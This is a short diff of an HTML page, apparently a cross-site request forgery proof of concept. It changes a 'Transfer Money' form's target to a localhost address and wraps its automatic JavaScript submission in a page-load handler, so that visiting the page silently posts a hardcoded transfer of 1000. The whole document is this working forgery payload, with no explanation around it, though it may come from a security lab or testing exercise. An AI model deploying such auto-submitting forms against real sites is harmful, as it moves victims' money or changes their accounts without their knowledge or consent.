@@ -8,7 +8,7 @@
 </head>
 <body>
     <h2>Transfer Money</h2>
-    <form id="transferForm" action="https://192.168.2.199:64710/" method="POST">
+    <form id="transferForm" action="http://127.0.0.1:8080" method="POST">
        <!-- Replace "your_csrf_token_here" with the actual CSRF token -->
         <div>
             <label for="recipient">Recipient:</label>
@@ -19,8 +19,9 @@
             <input type="number" id="inputAmount" name="amount" min="0" step="0.01" value="1000" required> <!-- Hardcoded amount value -->
         </div>
         <script>
-        
+        window.onload = function() {
             document.getElementById('transferForm').submit(); // Automatically submit the form when the page loads
+        };
     </script>
         <button type="submit">Transfer</button>
     </form>
